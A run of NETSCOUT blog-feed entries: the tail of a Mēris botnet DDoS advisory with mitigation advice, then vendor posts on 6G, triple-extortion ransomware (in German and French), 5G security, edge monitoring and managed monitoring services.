<p>HTTP pipelining is not supported by any current mainstream Web browsers, and such traffic may generally be filtered by defenders unless it is being used in the context of customized applications and/or services. Additionally, HTTP pipelining may generally be disabled on most Web servers, load balancers, revers proxies, and other relevant systems unless it it being used in specific contexts such as those described above.</p>

<h2>Recommended Actions</h2>

<p>Network operators should perform reconnaissance to identify and remove or remediate abusable Mikrotik routers deployed on their networks and/or the networks of their customers. In their initial weblog <a href="https://blog.qrator.net/en/meris-botnet-climbing-to-the-record_142/">post</a> describing the <em>Mēris</em> botnet, Internet security company Qrator included instructions for identifying potentially-compromised Mikrotik devices; Mikrotik also <a href="https://blog.mikrotik.com/security/meris-botnet.html">posted</a> details of vulnerable software versions. The NETSCOUT ASERT weblog <a href="https://www.netscout.com/blog/asert/tale-two-botnets">post</a>&nbsp;provides further classifiers for identifying <em>Mēris</em> and <em>Dvinis</em> botnet nodes.</p>

<p>All relevant network infrastructure, architectural and operational BCPs should be implemented by network operators.&nbsp;</p>

<p>HTTP pipelining should be disabled on Web servers, load balancers, reverse proxy servers, and other applicable systems which do not utilize it for specific, bespoke applications/services.</p>

<p>Organizations with business-critical public-facing internet properties should ensure that all relevant network infrastructure, architectural and operational BCPs have been implemented, including situationally-specific network access policies which only permit internet traffic via required IP protocols and ports. Deconflation of internet traffic associated with internet servers/services/applications from internet traffic generated by users on access networks is strongly recommended. Likewise, traffic originated by internet-facing servers which is unrelated to serving incoming requests (DNS lookups, outbound file transfers, etc.) should be sourced from separate interfaces and IP addresses from those used to service incoming application-/service-related traffic.</p>

<p>DDoS defenses for all public-facing internet properties and supporting infrastructure should be implemented in a situationally-appropriate manner, including periodic testing to ensure that any changes to organization’s servers/services/applications are incorporated into its DDoS defense plan. Organic, on-site intelligent DDoS mitigation capabilities should be combined with cloud or transit-based upstream DDoS mitigation services in order to ensure maximal responsiveness and flexibility during an attack.</p>

<p>It is imperative that organizations operating mission-critical public-facing internet properties and/or infrastructure ensure that all servers/services/application/datastores/infrastructure elements are protected against DDoS attack, and are included in periodic, realistic tests of the organization’s DDoS mitigation plan. In many instances, we have encountered situations in which obvious elements such as public-facing Web servers were adequately protected, but authoritative DNS servers, application servers, and other critical service delivery elements were neglected, thus leaving them vulnerable to attack.</p>

<p>If deemed necessary, flowspec can potentially be used in some circumstances to mitigate HTTP and HTTPs application-layer DDoS attacks, but it is important to ensure that reaction access-control list (ACL) stanzas are configured in such a way to minimize the risk of overblocking. In the context of this specific attack vector, the use of IDMS's such as NETSCOUT's <a href="https://www.netscout.com/product/arbor-threat-mitigation-system">TMS</a>&nbsp;or&nbsp;<a href="https://www.netscout.com/product/netscout-aed">AED/APS</a>&nbsp;is preferred in order to allow for more granular attack traffic mitigation.</p>

<p>All potential DDoS attack mitigation measures described in this Summary *MUST* be tested and customized in a situationally-appropriate manner prior to deployment on production networks.</p>

  <title>Almost Everything You Ever Wanted to Know About 6G but Were Too Busy to Ask</title>
  <link>http://localhost:7996/blog/everything-about-6g</link>
  <description>What Is 6G? Learn how it will build on the advances 5G has made in speed and capacity—and more.</description>
  <content:encoded><![CDATA[<p>I know; <em>I know</em>. You’re just wrapping your head (and maybe your service offerings) around the improvements 5G is bringing to your life, and now the term <em>6G</em> has entered the conversation. It’s a lot to take in. Well, we’re here to help.</p>

<p>6G will be the sixth generation of wireless technology. A new <a href="https://www.netscout.com/what-is/2g-3g-4g">generation</a> happens about every 10 years, and as the <a href="https://emfguide.itu.int/emfguide.html"><em>ITU EMF Guide</em></a> explains in “The generations of mobile communication” , “The key feature of each new technology is the increased spectral efficiency that allows transmission of more information using the same amount of resources including spectrum.”</p>

<p>To recap, our previous and current mobile technology generations are:</p>

<ul>
	<li><strong>1G:</strong> This generation was optimized for voice communications and not much else.</li>
	<li><a href="https://www.netscout.com/what-is/2g-3g-4g"><strong>2G</strong></a><strong>:</strong> In addition to voice, 2G made mobile texting (SMS) commonplace, with many mobile users also sending pictures and multimedia messages as well. 2G also introduced digital standards and protocols such as GSM, CDMA, GPRS, and EDGE. Mobile services using global positioning systems (GPS) also became a reality.</li>
	<li><a href="https://www.netscout.com/what-is/2g-3g-4g"><strong>3G</strong></a><strong>:</strong> Built on the previous generations, 3G enabled video conferencing, video streaming, mobile internet, and voice over IP (VoIP). With the standardization of web connectivity and expansion of GPS capabilities, international roaming services became a reality.</li>
	<li><a href="https://www.netscout.com/what-is/2g-3g-4g"><strong>4G</strong></a><strong>:</strong> 4G is the long-term evolution (LTE) generation of mobile telecommunications and added mobile ultra-broadband internet access to mobile devices. 4G technology-enabled high-quality video streaming (up to 1 gigabit per second for stationary users and network latencies of 5 milliseconds) to facilitate gaming services, high-definition videos, and high-quality video conferencing. Service providers that offered CDMA2000 or GSM/UMTS networks used the LTE standard as the upgrade from those earlier 3G standards to provide faster service. 4G technology reaches speeds up to 33.88 Mbps. Introduced in 2009, 4G is more than a decade old.</li>
	<li><a href="https://www.netscout.com/what-is/5G"><strong>5G</strong></a><strong>:</strong> Although 4G continues to improve the delivery of voice, data, and lightweight video streaming that consumers are currently using, 5G—introduced in 2020—tackles the heavy-hitting applications: virtual reality, enterprise Internet of Things (IoT), ultra-high-definition video, semi-autonomous vehicles, and other use cases that demand the increased speed, capacity, and real-time capabilities 4G can’t deliver. 5G has dramatically higher transfer rates and lower latency requirements than 4G, reaching speeds between 40 and 1,100 Mbps.</li>
</ul>

<h3>If 5G Is Brand-New, When Is 6G Coming, and Why Are We Talking About It Now?</h3>

<p>The ETA for 6G is 2030, and we’re talking about it because you want to know how it will build on the advances 5G has made in speed and capacity. Although it’s still in the theoretical and development stage, we do know that 6G will start where the 5G specifications end. 6G is predicted to operate in higher frequencies—the terahertz (THz) spectrum—with lower latency than 5G.</p>

<p>Because transmitting in the THz frequencies is best for short ranges only, cellular networks might become mesh networks, using multiple base stations and smaller inexpensive antennas to create microcells that can be accessed concurrently by 6G devices, or by relying on smart devices and smart surfaces (internet of everything) as networking elements to create microcells, or via some combination, leading to ambient connectivity. <a href="https://www.netscout.com/blog/your-information-close-enough-edge">Mobile edge computing</a> and core computing will certainly be completely integrated. Another theoretical solution is solving the <a href="https://www.6gchannel.com/6g-publications/full-duplex-and-wireless-powered-communications/">full duplex transmission</a> problem, which would allow two-way transmission on the same frequency, at the same time, doubling the capacity of current bandwidths. Or maybe 6G will be something else entirely—magic or unicorn-based technology. Who can say?</p>

<h3>Will 6G Be Fast?</h3>

<p>Using some or all of this new architecture, 6G networks are expected to support data rates of <a href="http://jultika.oulu.fi/files/isbn9789526226842.pdf">1 terabit per second (Tbps</a>). That’s 1,000,000 Mbps–pretty fast!</p>

<h3>Cool. But What Advances Will 6G Bring?</h3>

<p>Industry sources are currently talking about:</p>

<ul>
	<li><strong>Holographic-type communications.</strong> Sure, we’re all thinking about the “Princess Leia” kind of messages we’ve only seen in movies, but imagine what this could mean for truly integrated remote learning, geographically dispersed team meetings, telemedicine, museum exhibits–you name it. The things we’re just making work now could be commonplace with 6G.</li>
	<li><strong>Five-sense networks with fully tactile haptics.</strong> What’s this mean? It means the virtual reality (VR) experiences we’re just now enjoying will be turned up to 11. Imagine being able to see, hear, touch, smell, and <em>taste </em>your VR experience. That sounds fantastic for games, but imagine it applied to prosthetics. Prosthetic users could have seamless—possibly even neurological—integration with their devices and instantaneous response, perhaps using Wi-Fi implants.</li>
	<li><strong>Time-engineered applications.</strong> With the extremely low latency promised, large-scale, real-time, precise synchronization is possible—think super-efficient manufacturing or ports, or traffic-flow maintenance that is variable with traffic conditions minute by minute.</li>
	<li>&nbsp;<strong>Information and communication technologies (ICT) improvements to critical infrastructure.</strong> If an internet of everything is possible, search and rescue could get as granular as each <em>individual</em> in a disaster.</li>
	<li><strong>Custom microservices. </strong><a href="http://jultika.oulu.fi/files/isbn9789526226842.pdf">The development of user-specific, use-case-specific, and location-specific microservices.</a></li>
	<li><strong>Unmanned vehicles</strong>. Autonomous vehicles, planes, are a possibility with the sort of network coverage, data capacity, and low latency being discussed.</li>
	<li><strong>Increased sustainability.</strong> 6G should continue <a href="https://www.netscout.com/blog/big-5g-event">5G networks’ increasing sustainability</a>, with improvements in automation and with communications service providers (CSPs) able to reuse network equipment.</li>
	<li><strong>A close to the digital divide.</strong> As networks become easier and cheaper to deploy, coverage will expand. With networks moving from hardware to software, overall costs for CSPs and end users could drop as well.</li>
</ul>

<p>One way to consider 6G possibilities is to think of the modern conveniences and capabilities we still think of as “futuristic” or science fiction. 6G promises to make that future possible.</p>

  <title>Ransomware-Banden feiern Erfolge mit Dreifach-Erpressungstaktiken</title>
  <link>http://localhost:7996/de/blog/ransomware-banden-feiern-erfolge-mit-dreifach</link>
  <description>Cyberkriminelle haben durch die Kombination von Verschlüsselung, Datenraub und DDoS-Angriffen den Ransomware-Hattrick gelandet.</description>
  <content:encoded><![CDATA[<p>Wie jeder clevere Unternehmer wissen Angreifer, dass ihr Geschäft nur so erfolgreich wie ihre neueste Innovation sein kann. Diese Innovationen sind unaufhaltsam, wenn es um das Ziel geht, ungesicherte Organisationen um ihr Geld zu erleichtern.</p>

<p>Bei der neuesten Variante werden Angriffe in ein RaaS-Portfolio integriert („Ransomware-as-a-Service“, Ransomware als Dienstleistung), um den sogenannten Dreifach-Erpressungsangriff zu bilden. Er besteht aus ein wenig Lösegeld, ein wenig DDoS-Erpressung und jeder Menge Ärger. So funktioniert es:</p>

<ol>
	<li><strong>Verschlüsselung.</strong> Bei der herkömmlichen Ransomware-Angriffsmethode brechen Cyberkriminelle in ein Netzwerk ein und verschlüsseln wertvolle Daten, sodass das Opfer nicht mehr auf sie (und manchmal auch auf das gesamte System) zugreifen kann. Die Angreifer händigen dann im Austausch gegen ein Lösegeld die Entschlüsselung aus.</li>
	<li><strong>Raub.</strong> Hierbei extrahieren Cyberkriminelle die Daten, bevor sie das Opfer aussperren. Sie drohen daraufhin, die gestohlenen Daten zu veröffentlichen und/oder sie öffentlich zum Verkauf anzubieten, sofern das Opfer das verlangte Erpressungsgeld nicht zahlt. Bei dieser zweiten Stufe der Erpressung fällt es den Opfern besonders schwer, Ransomware-Gefahren zu ignorieren, denn selbst wenn Daten über Sicherungen wiederhergestellt werden können, besteht dennoch das Risiko der Datenveröffentlichung. Es handelt sich eindeutig um eine wertvolle Einnahmequelle: <a href="https://www.coveware.com/blog/q3-2020-ransomware-marketplace-report#:~:text=Average%20Ransomware%20Increases%20as%20Attackers%20Target%20Bigger%20Companies&amp;text=The%20average%20ransom%20payment%20increased,to%20drag%20the%20averages%20up.">Coveware</a> schätzt, dass im dritten Quartal 2020 bei knapp der Hälfte der Ransomware-Fälle Datenextraktion zum Einsatz kam.</li>
	<li><strong>DDoS-Angriff.</strong> DDoS-Angriffe sind eine gängige <a href="https://www.netscout.com/blog/asert/lazarus-bear-armada-ddos-extortion-campaign-december-2020">alleinstehende Erpressungsmethode</a> und gehören mittlerweile auch zum Serviceangebot von RaaS-Dienstleistern. Dadurch wird der Druck auf das Opfer in mehrfacher Hinsicht weiter erhöht: Zunächst bekräftigt der Angreifer damit, dass er eine ernstzunehmende Gefahr darstellt. Des weiteren ist der andauernde Druck ein weiterer Stressfaktor für das Sicherheitsteam, das mit den ersten beiden Vorfällen bereits alle Hände voll zu tun hat.</li>
</ol>

<p>Cyberkriminelle haben durch die Kombination von Verschlüsselung, Datenraub und DDoS-Angriffen den Ransomware-Hattrick gelandet, der die Wahrscheinlichkeit einer Lösegeldzahlung erhöhen soll. Laut <a href="https://www.bleepingcomputer.com/news/security/ransomware-gangs-add-ddos-attacks-to-their-extortion-arsenal/">Bleeping Computer</a> waren SunCrypt und Ragnor Locker unter den ersten Anwendern dieser Taktik. Seitdem sind weitere Ransomware-Akteure auf den Zug aufgesprungen, darunter <a href="https://www.bleepingcomputer.com/news/security/another-ransomware-now-uses-ddos-attacks-to-force-victims-to-pay/">Avaddon</a> und die für den Colonial-Pipeline-Vorfall verantwortliche Gruppe <a href="https://www.fireeye.com/blog/threat-research/2021/05/shining-a-light-on-darkside-ransomware-operations.html">DarkSide</a>.</p>

<p>Aus Sicht der Angreifer ist die Ergänzung der Ransomware-Dienstleistungen durch DDoS-Angriffe ein cleverer Schachzug für das Geschäft. DDoS-Angriffe sind unglaublich günstig, einfach einzuleiten und erhöhen die Wahrscheinlichkeit einer Lösegeldzahlung. Da kann man nicht Nein sagen. Es handelt sich schließlich um ein sehr lukratives Geschäft, und Angreifer fügen ständig neue Waffen zu ihrem bereits vielfältigen Arsenal hinzu. (Wir sehen sogar schon Akteure, die etwas Vergleichbares wie <a href="https://krebsonsecurity.com/2021/05/a-closer-look-at-the-darkside-ransomware-gang/">Support-Center</a> einrichten, um Opfer bei der Entschlüsselung zu unterstützen.)</p>

<p>Das Fazit: Durch zusätzliche Druckmittel wird die Wahrscheinlichkeit der Lösegeldzahlung erhöht. Dies macht Ransomware zu einer immer schädlicheren Form der Cyberkriminalität – nicht nur für Unternehmen, sondern auch Regierungen, Schulen und die öffentliche Infrastruktur.</p>

<p>Inzwischen wird auf diese Krise reagiert, beispielsweise durch die <a href="https://securityandtechnology.org/ransomwaretaskforce/">Ransomware Task Force</a> (RTF) des Institute for Security and Technology. Die RTF besteht aus einer vielfältigen Gruppe aus Fachkräften aus der Industrie, Regierung, Polizei, Zivilgesellschaft sowie internationalen Organisationen und veröffentlichte kürzlich <a href="https://securityandtechnology.org/ransomwaretaskforce/report/">wesentliche Empfehlungen</a>, um gegen dieses von der Gruppe als dringliches Sicherheitsrisiko bezeichnete Problem vorzugehen. Das ist ein guter Start, doch um Ransomware-Aktivitäten einen bedeutenden Schlag zu versetzen, sind globale Langzeitanstrengungen vonnöten.</p>

<p>In der Zwischenzeit sollten sich Unternehmen an einige grundlegende Schutzmaßnahmen halten:</p>

<ul>
	<li><strong>Vermeiden Sie die Verletzung des Netzes.</strong> Zu den bewährten Vorgehensweisen gehören die Schulung des Personals zu sorgfältiger Cyberhygiene und die Einrichtung von Netzwerk- und <a href="https://www.netscout.com/blog/demo-blocking-ransomware-and-ddos-extortion-attacks">Endpunkt-Cybersicherheitslösungen</a> für die Erkennung von Malware, ungewöhnlicher Aktivität oder Indicators of Compromise (IoCs, Anzeichen auf Kompromittierung).</li>
	<li><strong>Auf die Grundlagen achten.</strong> Sichern Sie wertvolle Daten und testen Sie Wiederherstellungspläne. Führen Sie Verwundbarkeitsauswertungen durch und patchen/aktualisieren Sie Computersysteme entsprechend, um Gefährdungen zu vermeiden.</li>
	<li><strong>Fortlaufende Threat Intelligence einsetzen.</strong> In Bezug auf Threat Intelligence am Ball zu bleiben, kann Unternehmen dabei helfen, IoCs, die Vorboten eines Ransomware-Angriffs sein können, zu erkennen, zu untersuchen oder proaktiv zu jagen.</li>
	<li><strong>Angemessenen DDoS-Schutz einsetzen.</strong> DDoS-Angriffe nehmen an Umfang, Häufigkeit und Komplexität zu. Zu den bewährten Vorgehensweisen für die DDoS-Abwehr gehört eine hybride und intelligente Kombination aus Cloud-basierten und lokalen DDoS-Abwehrmaßnahmen.</li>
</ul>

<p>Zu guter Letzt sollten Organisationen spezialisierte Cybersecurity-Lösungen einsetzen, die bei der Abwehr aller drei Facetten eines Dreifach-Erpressungsangriffs helfen können.</p>

  <title>Why 5G Networks Need Embedded Security</title>
  <link>http://localhost:7996/blog/why-5g-networks-need-embedded-security</link>
  <description>By embedding security capabilities within the 5G mobile network, CSPs gain several benefits, including the ability to identify and mitigate threats more quickly; correlation of threats across multiple monitoring locations; gaining a complete view of endpoint behavior; and ensuring that security capabilities grow with the network as needed.</description>
  <content:encoded><![CDATA[<p>Security has become a major focal point for communication services providers (CSPs) that are launching 5G networks to increase market share, create new revenue opportunities, and rejuvenate bottom lines.</p>

<p>But 5G operators also are increasingly aware that monetizing 5G's capabilities requires in-depth security across their operating practices, as well as embedded in the services they deliver. This is especially true for 5G standalone (SA) deployments, which have begun to proliferate.</p>

<p><strong>How does this relate to security?</strong></p>

<p>With 5G SA, the security landscape changes significantly, as the mobile core architecture is now a services-based architecture (SBA). While this is critical to unlocking a lot of 5G’s potential, the new 5G core opens up new vulnerabilities and requires a fundamentally new approach to securing the 5G core.&nbsp;</p>

<p>Next-generation 5G services will run over new multiplexed, virtualized network infrastructures with higher RAN speeds, with low-latency communications to applications and service infrastructures deployed closer to the end user.&nbsp;</p>

<p>As more services are moved closer to users, increased visibility and control are required to ensure both service availability and security - specifically in areas of the network historically lacking both this visibility and control.</p>

<p>5G also enables enterprises to transform their business processes, and as business 5G services are rolled out across telco networks attack surfaces continue to grow. Enterprises will require visibility and threat detection to manage risk from these new 5G services and ensure the continued integrity of their operations and confidentiality of their data.</p>

<p>5G IoT devices, whether consumer, enterprise, or industrial in nature, creates a huge attack surface. In the case of consumer devices, as in wireline networks, devices can be compromised. In the case of enterprise or industrial IoT, the consequences of compromise can range from reduced lifespan of the device itself, through data breach, to loss of integrity in services that support real-world critical functions. Network exposure function (NEF) gives third-party applications direct access to 5G core functions, significantly expanding its capabilities but also increasing the likelihood it will be targeted by attackers.</p>

<p>In all cases, compromised devices can be used for DDoS attacks.</p>

<p>All of this new technology, along with new vendors and new services, represents opportunity for performance, availability, and security problems—whether from malicious attack or unintentional implementation issue.</p>

<p><strong>Why embed security?</strong></p>

<p>By embedding security capabilities within the mobile network, CSPs gain several benefits, including the ability to identify and mitigate threats more quickly; correlation of threats across multiple monitoring locations; gaining a complete view of endpoint behavior; and ensuring that security capabilities grow with the network as needed.</p>

  <content:encoded><![CDATA[<p>The adoption of edge computing is exploding. A recent market <a href="https://www.mordorintelligence.com/industry-reports/edge-computing-market-industry">report</a> predicts spending on edge computing will reach nearly $11 billion by 2026, representing an increase of 29.4 percent over a six-year period starting in 2020. A growing number of enterprises are embracing next-gen infrastructures to meet evolving needs. Such infrastructures are more aptly described as an ecosystem of different environments—from multiple cloud services to data centers.</p>

<p>As a result of these complex environments, IT faces the challenge of having to monitor and manage a rapidly expanding number of edges. Each of those edges holds the potential of becoming a roadblock that impedes everything from a remote worker’s productivity to the experience of an online shopper. For this reason, it is important for IT to gain a better understanding of the edge and resulting visibility challenges.</p>

<p>There are three general location types in today’s complex networks: client, network, and data center/cloud service edges. It is worth noting that these three edges share a common characteristic in that traffic is altered as it crosses domains between them. So, for instance, when traffic goes from wireless to wired connections, or LAN to WAN, or ISP to co-lo, co-lo to cloud, or cloud to server workload, a change occurs at each edge, creating a possible gap in visibility.</p>

<p>Let’s take a closer look at each type of edge.&nbsp;</p>

<p><strong>What is the Client Edge?</strong><br>

The client edge is essentially where the end user connects to the network via shared infrastructure to access specific services. This might occur in a remote branch office, a home office, a contact center, or within a business’ headquarters. Other types of workers might require connectivity to a hospital or other type of medical facility, a manufacturing plant or factory, or perhaps a warehouse or distribution center. The client edge is essentially wherever the end user is.&nbsp;</p>

<p><strong>What is the Network Edge?</strong></br>

The network edge is defined as the boundaries between IT domains or an interface between two network segments. When moving from one edge to the next service edge, network packets may be modified in some way. Adding to the challenge for IT in monitoring this traffic, the different domain points may be owned by different organizations.</p>

<p>A common example of this is the point where user traffic traverses the WAN. This might involve the connection between a remote site and the internet, WAN, or software-defined WAN (SD-WAN). It might also be peering locations in co-los, such as in the case of public cloud or the internet. Other network edges might include virtual private network (VPN) concentrators and/or virtual desktop infrastructure (VDI) load balancers for remote access; firewalls; DMZs; load-balancers for security; centralized SD-WAN concentrators at data centers, co-los, and/or public cloud; and private data center edges.</p>

<p><strong>What is the Data Center/Cloud Service Edge?</strong></br>

The final edge is the data center/cloud service edge, which is the first server that traffic from the client hits, wherever that application stack resides. This edge might include data centers, private or public cloud, and any point where communications between the different application tiers or microservices occur over east-west connections.</p>

<p><strong>The Need for End-Through-End Visibility and Control </strong></br>

Monitoring at these different edges is essential for gaining end-through-end visibility, enabling effective troubleshooting of end-user experience and application performance. The combined use of both packet data and synthetic test technologies for monitoring at these different edges is key to success. Synthetic testing that includes business transaction testing capabilities allows IT to simulate the different types of interactions an end user has with applications across a business environment.</p>

<p>Adopting a smart edge monitoring approach provides IT with the visibility and control it needs to reduce mean time to knowledge (MTTK) and mean time to restore (MTTR). When it comes to smart edge monitoring, NETSCOUT is the right choice. Our Smart Edge Monitoring is a next-generation solution designed to provide visibility across all of the edges of an enterprise’s infrastructure, allowing IT to deliver the best digital end-user experience across any application.</p>

  <title>You Can’t Fix What You Don’t Know</title>
  <link>http://localhost:7996/blog/you-cant-fix-what-you-dont-know</link>
  <description>VaaS managed monitoring services can help IT organizations overcome staff shortages and training issues.</description>
  <content:encoded><![CDATA[<p>As networks become more complex and rely on hybrid cloud infrastructures to provide vital services and applications, the burden on IT to assure performance and deliver a stellar end-user experience has never been more acute. This challenge is exacerbated by today’s workforce labor shortage, which includes IT professionals. A recent <a href="https://www.zdnet.com/article/the-shortage-of-tech-workers-is-about-to-become-an-even-bigger-problem-for-everyone/">ZDNet</a> report found that 64 percent of businesses surveyed believe the largest barrier to implementation of new technologies is a shortage of IT talent.</p>

<p>As new technologies are implemented and must be managed, there is also a learning curve that must be factored in, because IT staff—from NetOps, unified communications and collaboration (UC&amp;C), cloud, AppOps, and SecOps—must be brought up to speed. Questions abound. How much time and how many people will be needed to implement new tech? How quickly can existing staff get new systems and solutions deployed and then configure them in order to take full advantage for the business? Will additional training be required to supplement staff knowledge and experience?</p>

<p>Rarely are these transitions an overnight, flip-the-switch adoption. There typically is a deliberate process that usually entails a test period in an IT lab; a small pilot test with actual users; and, assuming the pilot goes well, a scheduled transition and migration for all users. What does business continuity look like as the company migrates from the old technology to the new technology? How does IT split time between reactive triage and troubleshooting on legacy technology and proactive implementation and rollout of new digital transformations?</p>

<p><strong>The Value of Managed Monitoring Services</strong></p>

<p>One way IT organizations can overcome staff shortages and training issues is by using managed monitoring services. By leveraging NETSCOUT <a data-entity-substitution="canonical" data-entity-type="node" data-entity-uuid="4f244bd0-a95f-47b6-9598-5ff026f6b10d" href="http://localhost:7996/solutions/netscout-visibility/communications" title="NETSCOUT VaaS Solutions for Unified Communications and Collaboration">Visibility-as-a-Service (VaaS)</a>, IT can tap into an outsourced expert that handles setup and configuration of monitoring-technology implementations. At the same time, a VaaS provider can share and train IT personnel on best-practice approaches, bringing additional value to the performance-monitoring solutions.</p>

<p>Once VaaS monitoring detects issues, VaaS experts investigate to help pinpoint the root cause of problems and collaborate with IT for the resolution.

  <title>5G Expanded Services: Blessing, Threat, or Both?</title>
  <link>http://localhost:7996/blog/5g-expanded-services-blessing-threat-or-both</link>
  <description>Next-generation mobile technologies are enabling new services to be delivered by mobile networks—and with those new services come new security threats and challenges for CSPs and their customers.</description>
  <content:encoded><![CDATA[<p>Next-generation mobile technologies such as ultra-reliable low latency communications (URLLC), high speed enhanced mobile broadband (EMBB) and the deployment of the multi-access edge cloud (MEC) are enabling both enterprise-specific applications and services as well as enhanced end-user services and experiences—key revenue targets for mobile operators.</p>

<p>These new services combined with the burgeoning Internet of Everything are bringing an evolutionary shift in connected devices and 5G usage.</p>

<p>But these new services also are attracting the attention of attackers. DDoS activity has skyrocketed since 5G non-standalone (NSA) networks started going live, and carriers now are beginning to deploy 5G standalone (SA) networks, giving attackers an even larger attack surface with higher-value targets.</p>

<p><strong>What's the Risk for 5G Service Providers?</strong></p>

<p>The greatest threats for providers of 5G services are network availability/downtime problems, loss of data, and inability to meet regulatory or compliance dictates. Although all three are of concern, service providers are especially concerned with DDoS attacks and threats that directly impact network availability.</p>

<p>The entire purpose behind DDoS attacks is to disrupt and deny a service. It’s no secret that 5G service providers are banking on those networks to deploy new services and improve the bottom line. But when those services are disrupted by attacks, 5G customers—especially enterprise customers—feel the greatest impact.</p>

<p>And enterprise customers are definitely concerned about the security of 5G networks, as evidenced by Accenture’s recent survey of more than 2,600 business decision-makers. <a href="https://www.accenture.com/us-en/insights/communications-media/accelerating-5g-future-business">35 percent of those business leaders expressed concern about 5G security</a>, and 62 percent said 5G will leave them more vulnerable to attacks.</p>

<p><strong>Just How Bad Is It?</strong></p>

<p>Communications service providers (CSPs) are no strangers to DDoS attacks, as the latest <a href="https://www.netscout.com/threatreport">NETSCOUT Threat Intelligence Report</a> shows. CSPs make up four of the top 10 targets for DDoS attacks, accounting for more than 384,000 attacks in 1H 2021.</p>

<p>Three areas of specific concern for 5G service providers are:</p>

<ul>
	<li><strong>Expanded services enabled by 5G:</strong> This includes new services on 5G networks, as well as the increased traffic that will be generated by an uptick of connected mobile devices.</li>
	<li><strong>Internet of Things (IoT):</strong> IoT device growth is astronomical, with every connected device generating a larger attack surface for attackers to target.</li>
	<li><strong>5G standalone (SA) core:</strong> 5G SA networks are in the infancy of deployment, and they enable services such as enhanced mobile broadband (embb) and massive machine type communication (mmtc)—making them even more attractive to attackers.</li>
</ul>

<p><strong>What Can CSPs Do to Stop Attackers?</strong></p>

<p>The good news is that CSPs have ways to mitigate DDoS attacks and other threats against 5G networks.</p>

  <description>Les cybercriminels ont trouvé le trio gagnant des rançonlogiciels en combinant le cryptage de fichier, le vol de données et les attaques DDoS.</description>
  <content:encoded><![CDATA[<p>Comme tout entrepreneur intelligent, les acteurs malveillants savent que le succès de leur entreprise dépend de celui de leur dernière innovation. Et lorsqu’il s’agit d’extorquer de l’argent aux organisations non sécurisées, les innovations sont nombreuses.</p>

<p>La dernière en date consiste à intégrer des attaques dans un portefeuille de ransomware-as-a-service (RaaS) pour créer ce que l’on appelle une triple attaque de cyber-extorsion. Elle est composée d’un peu de rançon, d’un peu d’extorsion DDoS, et de beaucoup de problèmes. Voici son fonctionnement :</p>

<ol>
	<li><strong>Cryptage.</strong> Avec la méthode traditionnelle d’attaque par ransomware, les cybercriminels pénètrent dans un réseau et cryptent les données de valeurs (voire parfois le système entier), pour les rendre indisponibles pour l’organisation visée. Ensuite, les cybercriminels réclament un paiement un échange d’une clé de décryptage.</li>
	<li><strong>Vol de données.</strong> Pour le vol, les cybercriminels exfiltrent les données avant de bloquer l’accès à la victime. Ils menacent d’exposer et/ou de vendre publiquement les données volées si la victime ne paie pas. Avec ce deuxième niveau d’extorsion, il est plus difficile pour les victimes d’ignorer les menaces de ransomware, car mêmes si elles peuvent restaurer leurs données à l’aide de sauvegardes, ces victimes restent exposées au risque d’exposition de leurs données. Il s’agit clairement d’un outil de monétisation précieux : <a href="https://www.coveware.com/blog/q3-2020-ransomware-marketplace-report#:~:text=Average%20Ransomware%20Increases%20as%20Attackers%20Target%20Bigger%20Companies&amp;text=The%20average%20ransom%20payment%20increased,to%20drag%20the%20averages%20up." target="_blank">Coveware</a> estime qu’au troisième trimestre de l’année 2020, près de la moitié des attaques par ransomware avaient utilisé des tactiques d’exfiltration.</li>
	<li><strong>Attaque DDoS.</strong> Plus couramment utilisées comme une <a href="https://www.netscout.com/blog/asert/lazarus-bear-armada-ddos-extortion-campaign-december-2020">méthode d’extorsion autonome</a>, les attaque DDoS font désormais partie de la liste des services proposés par les opérateurs de RaaS. Ce type d’attaque accentue la pression sur la victime de deux façons : Tout d’abord, elle souligne le sérieux de l’adversaire. Ensuite, le maintien de la disponibilité ajoute aussi un autre facteur de stress à une équipes de sécurité déjà confrontée aux deux précédents événements.</li>
</ol>

<p>En combinant le cryptage de fichier, le vol de données et les attaque DDoS, les cybercriminels ont trouvé un trio gagnant de ransomware conçu pour augmenter la probabilité de paiement. D’après <a href="https://www.bleepingcomputer.com/news/security/ransomware-gangs-add-ddos-attacks-to-their-extortion-arsenal/">Bleeping Computer</a>, les ransomware SunCrypt et Ragnor Locker ont été les premiers à utiliser cette tactique. &nbsp; Depuis, d’autres opérateurs de ransomware ont adopté la même tactique, y compris <a href="https://www.bleepingcomputer.com/news/security/another-ransomware-now-uses-ddos-attacks-to-force-victims-to-pay/">Avaddon</a> et <a href="https://www.fireeye.com/blog/threat-research/2021/05/shining-a-light-on-darkside-ransomware-operations.html">Darkside</a>, auteur de la cyberattaque contre Colonial Pipeline.&nbsp;</p>

<p>Du point de vue des cybercriminels, l’ajout des attaques DDoS à une liste de services de ransomware constitue une démarche commerciale intelligente. Ces attaques DDoS sont incroyablement bon marché et il est facile de les mettre en place. De plus, elles ont tendance à augmenter les chances que la victime paie la rançon. Il s’agit d’une activité très lucrative, et les acteurs malveillants ajoutent constamment de nouvelles armes à leurs campagnes d’attaques aux multiples facettes. (Nous voyons même certains opérateurs ajouter l’équivalent de <a href="https://krebsonsecurity.com/2021/05/a-closer-look-at-the-darkside-ransomware-gang/">centres d’assistance</a> pour aider leurs victimes à décrypter leurs données.)</p>

<p>En définitive, l’augmentation des moyens de pression accroît la probabilité d’un paiement, ce qui fait des ransomware une forme de cybercriminalité de plus en plus perturbatrice qui touche non seulement les entreprises, mais aussi les gouvernements, les écoles ainsi que les infrastructures publiques.</p>

<p>Nous observons des réponses à cette crise, comme la <a href="https://securityandtechnology.org/ransomwaretaskforce/">Ransomware Task Force</a> (RTF), créée par le Institute for Security and Technology. Constituée d’une large coalition d’experts de l’industrie, du gouvernement, des forces de l’ordre, de la société civile et des organisations internationales, la RTF a récemment publié des <a href="https://securityandtechnology.org/ransomwaretaskforce/report/">recommandations clés</a> pour combattre ce que le groupe caractérise comme un risque de sécurité urgent. C’est un début, mais il faudra un effort mondial soutenu pour parvenir à freiner l’activité des ransomware.</p>

<p>En attendant, les entreprises doivent respecter certaines protections fondamentales :</p>

<ul>
	<li><strong>Violation ne convient pas.</strong> Les meilleures pratiques consistent notamment à former les utilisateurs à adopter une bonne hygiène numérique en matière de cybersécurité et à utiliser des <a href="https://www.netscout.com/blog/demo-blocking-ransomware-and-ddos-extortion-attacks">solutions de protection de la cybersécurité des points de terminaison</a> et des réseaux pour détecter les logiciels malveillants, les activités anormales ou encore les indicateurs de compromission (IoC).</li>
